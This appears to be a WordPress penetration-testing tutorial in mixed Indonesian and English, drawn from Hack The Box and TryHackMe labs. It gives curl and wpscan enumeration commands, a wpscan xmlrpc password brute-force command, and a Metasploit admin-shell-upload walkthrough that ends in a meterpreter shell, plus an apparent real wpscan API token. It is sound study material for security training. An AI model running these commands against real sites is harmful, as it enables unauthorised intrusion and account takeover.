#          🔥Hacking-Wordpress 🔥
![wordpress-hacking](https://user-images.githubusercontent.com/79256105/165776319-f7d73fb8-6bd9-4847-97da-461b641fbfe0.png)

# Basic Wordpress and Wordpress Structure
### 🔥Wordpress Structure 🔥

WordPress dapat diinstal pada host Windows, Linux, atau Mac OSX.  Untuk modul ini, kami akan fokus pada instalasi WordPress default di server web Ubuntu Linux.  WordPress memerlukan tumpukan LAMP yang terinstal dan terkonfigurasi sepenuhnya (sistem operasi Linux, Server HTTP Apache, database MySQL, dan bahasa pemrograman PHP) sebelum penginstalan pada host Linux.  Setelah instalasi, semua file dan direktori pendukung WordPress akan dapat diakses di webroot yang terletak di /var/www/html.

Di bawah ini adalah struktur direktori instalasi WordPress default, menunjukkan file kunci dan subdirektori yang diperlukan agar situs web berfungsi dengan baik.


     tree -L 1 /var/www/html

     ├── index.php
     ├── license.txt
     ├── readme.html
     ├── wp-activate.php
     ├── wp-admin
     ├── wp-blog-header.php
     ├── wp-comments-post.php
     ├── wp-config.php
     ├── wp-config-sample.php
     ├── wp-content
     ├── wp-cron.php
     ├── wp-includes
     ├── wp-links-opml.php
     ├── wp-load.php
     ├── wp-login.php
     ├── wp-mail.php
     ├── wp-settings.php
     ├── wp-signup.php
     ├── wp-trackback.php
     └── xmlrpc.php

## 👽 Key WordPress Files ♀️

Direktori root WordPress berisi file yang diperlukan untuk mengonfigurasi WordPress agar berfungsi dengan benar.

    index.php is the homepage of WordPress.

    license.txt contains useful information such as the version WordPress installed.

    wp-activate.php is used for the email activation process when setting up a new WordPress site.

    wp-admin folder contains the login page for administrator access and the backend dashboard. Once a user has logged in, they can make changes to the site based on their assigned permissions. The login page can be located at one of the following paths:
    /wp-admin/login.php
    /wp-admin/wp-login.php
    /login.php
    /wp-login.php

File ini juga dapat diganti namanya agar lebih sulit menemukan halaman login.

    xmlrpc.php is a file representing a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. This type of communication has been replaced by the WordPress REST API.
WordPress Configuration File
## WordPress Configuration File
    File wp-config.php berisi informasi yang diperlukan oleh WordPress untuk terhubung ke database, seperti nama database, host database, nama pengguna dan kata sandi, kunci dan salt autentikasi, dan awalan tabel database.  File konfigurasi ini juga dapat digunakan untuk mengaktifkan mode DEBUG, yang berguna dalam pemecahan masalah.
wp-config.php


    Code: php

    <?php
    /** <SNIP> */
    /** The name of the database for WordPress */
    define( 'DB_NAME', 'database_name_here' );

    /** MySQL database username */
    define( 'DB_USER', 'username_here' );

    /** MySQL database password */
    define( 'DB_PASSWORD', 'password_here' );

    /** MySQL hostname */
     define( 'DB_HOST', 'localhost' );

     /** Authentication Unique Keys and Salts */
      /* <SNIP> */
     define( 'AUTH_KEY',         'put your unique phrase here' );
     define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
     define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
     define( 'NONCE_KEY',        'put your unique phrase here' );
     define( 'AUTH_SALT',        'put your unique phrase here' );
     define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
     define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
     define( 'NONCE_SALT',       'put your unique phrase here' );

     /** WordPress Database Table prefix */
     $table_prefix = 'wp_';

     /** For developers: WordPress debugging mode. */
    /** <SNIP> */
    define( 'WP_DEBUG', false );

    /** Absolute path to the WordPress directory. */
     if ( ! defined( 'ABSPATH' ) ) {
     define( 'ABSPATH', __DIR__ . '/' );
    }

    /** Sets up WordPress vars and included files. */
    require_once ABSPATH . 'wp-settings.php';

# Key WordPress Directories
Folder wp-content adalah direktori utama tempat plugin dan tema disimpan.  Subdirektori uploads/ biasanya tempat file yang diunggah ke platform disimpan.  Direktori dan file ini harus dihitung dengan hati-hati karena dapat berisi data sensitif yang dapat menyebabkan eksekusi kode jarak jauh atau eksploitasi kerentanan atau kesalahan konfigurasi lainnya.
    
#### WP-Content

    tree -L 1 /var/www/html/wp-content

    ├── index.php
    ├── plugins
    └── themes
 
#### WP-Includes

wp-includes berisi segalanya kecuali komponen administratif dan tema milik situs web.  Ini adalah direktori tempat file inti disimpan, seperti sertifikat, font, file JavaScript, dan widget.

   
     tree -L 1 /var/www/html/wp-includes

     ├── theme.php
     ├── update.php
     ├── user.php
     ├── vars.php
     ├── version.php
     ├── widgets
     ├── widgets.php
     ├── wlwmanifest.xml
     ├── wp-db.php
     └── wp-diff.php
     
 
# WordPress User Roles 

Ada lima jenis pengguna dalam instalasi WordPress standar.

     Role 	          Description
     Administrator 	Pengguna ini memiliki akses ke fitur administratif di dalam situs web.  Ini termasuk menambah dan menghapus pengguna dan posting, serta mengedit kode sumber.
     Editor 	     Editor dapat menerbitkan dan mengelola postingan, termasuk postingan pengguna lain.
     Author 	     Penulis dapat menerbitkan dan mengelola posting mereka sendiri.
     Contributor 	Pengguna ini dapat menulis dan mengelola postingan mereka sendiri tetapi tidak dapat menerbitkannya.
     Subscriber 	Ini adalah pengguna normal yang dapat menelusuri posting dan mengedit profil mereka.


Mendapatkan akses sebagai administrator biasanya diperlukan untuk mendapatkan eksekusi kode di server.  Namun, editor dan penulis mungkin memiliki akses ke plugin rentan tertentu yang tidak dimiliki oleh pengguna biasa.
 
 
# 🥇Enumeration Procedure For Wordpress Website in Manually

### Wordpress Version Check

Check Wordpress Version using given below curl command or seeing source code

    commnad:
            curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'
        
 Also check WP Version - CSS and WP Version - JS version from Source Code 
 
### ▶️ Plugins and Themes Enumeration

Commnad For Plugins: 
      
      curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
 
Command For Themmes:
      
      curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
      
    
#### ⏩ User Enumeration
Menghitung daftar pengguna yang valid adalah fase penting dari penilaian keamanan WordPress.  Berbekal daftar ini, kami mungkin dapat menebak kredensial default atau melakukan serangan kata sandi yang kejam.  Jika berhasil, kita mungkin bisa masuk ke backend WordPress sebagai penulis atau bahkan sebagai administrator.  Akses ini berpotensi dimanfaatkan untuk memodifikasi situs web WordPress atau bahkan berinteraksi dengan server web yang mendasarinya.

Command :
        
        curl http://blog.inlanefreight.com/wp-json/wp/v2/users
         
         
 
# ⤵️Enumeration Procedure For Wordpress Website in Automatically Using wpscan
WPScan adalah pemindai WordPress otomatis dan alat enumerasi.  Ini menentukan apakah berbagai tema dan plugin yang digunakan oleh situs WordPress sudah usang atau rentan.  Itu diinstal secara default di Parrot OS, Kali OS tetapi juga dapat diinstal secara manual dengan permata
         gem install wpscan
Setelah penginstalan selesai, kami dapat mengeluarkan perintah seperti ***wpscan*** --hh untuk memverifikasi penginstalan.  Perintah ini akan menunjukkan kepada kita menu penggunaan dengan semua sakelar baris perintah yang tersedia.
### 🔥Enumerating a Website with WPScan ⚛️
Bendera --enumerate digunakan untuk menghitung berbagai komponen aplikasi WordPress seperti plugin, tema, dan pengguna.  Secara default, ***WPScan menghitung plugin, tema, pengguna, media, dan cadangan yang rentan***.  Namun, argumen khusus dapat diberikan untuk membatasi pencacahan ke komponen tertentu.  Misalnya, semua plugin dapat dihitung menggunakan argumen --enumerate ap.  Mari jalankan pemindaian pencacahan normal terhadap situs web WordPress.
Command :

            wpscan --url http://blog.inlanefreight.com --enumerate --api-token api-token-value
Example :
 
            wpscan --url http://10.129.2.37/ --enumerate --api-token cs0QRHwsYE6RvLd6SaHDhI1dmNX8ZVLEx0Fb7mNid9s
            
      
##### 👀Note: Api Token Generator Link https://wpscan.com/


# ✔️ Exploiting a Vulnerable Plugin
If we are checking and testing properly of our target wordpress website and if  target wordpress website is vulneable we will see some CVE or Exploite information after using above wpscan command
### ☑️WordPress User Bruteforce
WPScan can be used to brute force usernames and passwords. The tool uses two kinds of login brute force attacks, xmlrpc and wp-login. The wp-login method will attempt to brute force the normal WordPress login page, while the xmlrpc method uses the WordPress API to make login attempts through /xmlrpc.php. The xmlrpc method is preferred as it is faster.

Command :
          
          wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
          
#### 👁️Note: use username and password in http://sitename/login path
          
# 🔥Remote Code Execution (RCE) via the Theme Editor 🔥

With administrative access to WordPress, we can modify the PHP source code to execute system commands. To perform this attack, log in to WordPress with the administrator credentials, which should redirect us to the admin panel. Click on Appearance on the side panel and select Theme Editor. This page will allow us to edit the PHP source code directly. We should select an inactive theme in order to avoid corrupting the main theme.

# 🔥Attacking WordPress with Metasploit 🔥
We can use the Metasploit Framework (MSF) to obtain a reverse shell on the target automatically. This requires valid credentials for an account that has sufficient rights to create files on the webserver.
###### To obtain the reverse shell, we can use the wp_admin_shell_upload module. We can easily search for it inside MSF:

        msf5 > search wp_admin

###### Matching Modules

0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload
###### Module Selection:
msf5 > use 0

msf5 exploit(unix/webapp/wp_admin_shell_upload) >

###### Module Options
                  
        msf5 exploit(unix/webapp/wp_admin_shell_upload) > options

##### Module options (exploit/unix/webapp/wp_admin_shell_upload):


       PASSWORD                    yes       The WordPress password to authenticate with
       Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
       RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
       RPORT      80               yes       The target port (TCP)
       SSL        false            no        Negotiate SSL/TLS for outgoing connections
       TARGETURI  /                yes       The base path to the wordpress application
       USERNAME                    yes       The WordPress username to authenticate with
       VHOST                       no        HTTP server virtual host


Exploit target:

       Id  Name
       --  ----
       0   WordPress
    
#### set and Exploitation
   
    msf5 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.com
    msf5 exploit(unix/webapp/wp_admin_shell_upload) > set username admin
    msf5 exploit(unix/webapp/wp_admin_shell_upload) > set password Winter2020
    msf5 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.16.8
    msf5 exploit(unix/webapp/wp_admin_shell_upload) > run

meterpreter > getuid
Server username: www—data (33)
## 🙏Practicing Sites:
                  https://tryhackme.com/room/allinonemj
                  https://tryhackme.com/room/wordpresscve202129447
                  https://tryhackme.com/room/blog
                  
## 🎆 Website Security Testing Site:
                                   https://sitecheck.sucuri.net/
                                    
## 💠 Happy Hackings 🔡

## ℹ️  Source: Hack The Box Accademy and Try Hack Me 🔽
